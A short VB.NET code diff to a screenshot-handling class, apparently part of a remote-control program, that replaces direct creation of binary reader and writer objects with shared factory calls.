@@ -22,7 +22,7 @@ Public Class clsScreenshot
     End Sub
 
     Public Overrides Sub OnPacketArrived(ByVal packet() As Byte)
-        Dim BinReader As clsArrayBinaryReader = New clsArrayBinaryReader()
+        Dim BinReader As clsArrayBinaryReader = mGlobal.GetBinReaderObj()
         Dim ID As Byte = packet(0)
         Select Case ID
             Case 0 'Case received BMP screenshot
@@ -43,7 +43,7 @@ Public Class clsScreenshot
     End Sub
 
     Public Sub SendTakeScreenshot()
-        Dim BinWritter As clsArrayBinaryWritten = New clsArrayBinaryWritten
+        Dim BinWritter As clsArrayBinaryWritten = mGlobal.GetBinWritterObj()
         Dim packet As Byte() = {}
 
         BinWritter.BufferAddByte(packet, 1)
